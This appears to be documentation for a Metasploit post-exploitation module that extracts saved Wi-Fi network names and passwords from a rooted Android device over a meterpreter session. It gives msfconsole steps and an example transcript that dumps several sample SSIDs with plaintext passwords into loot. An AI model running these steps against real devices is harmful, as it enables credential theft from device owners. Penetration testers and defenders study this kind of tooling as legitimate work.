## Vulnerable Application

  This post-exploitation module will extract all saved Wireless access point credentials from the target android device.

## Verification Steps

  1. Start `msfconsole`
  2. Get a *root* meterpreter session (use exploit/android/local/...)
  3. Do: `use post/android/gather/wireless_ap`
  4. Do: `set SESSION <session id>`
  5. Do: `run`

## Options

  - **SESSION** - The session to run the module on.

## Extracted data

  - Wireless AP credentials (SSID, network type and password)

## Example Scenario


```
msf5 exploit(multi/handler) > use post/android/gather/wireless_ap
msf5 post(android/gather/wireless_ap) > set session 1
session => 1
msf5 post(android/gather/wireless_ap) > run

Wireless APs
============

 SSID                  net_type  password
 ----                  --------  --------
 ADYYYXRoYXJ2YWpvc2hp  WPA-PSK   lkjhgfdsa
 FCP_WiFi              NONE
 HomeCable             WPA-PSK   p@$$w0rd
 Troika                WPA-PSK   ika@12345
 

[+] Secrets stored in: ~/.msf4/loot/...wireless.ap.cred_...txt
[*] Post module execution completed
msf5 post(android/gather/wireless_ap) >
```
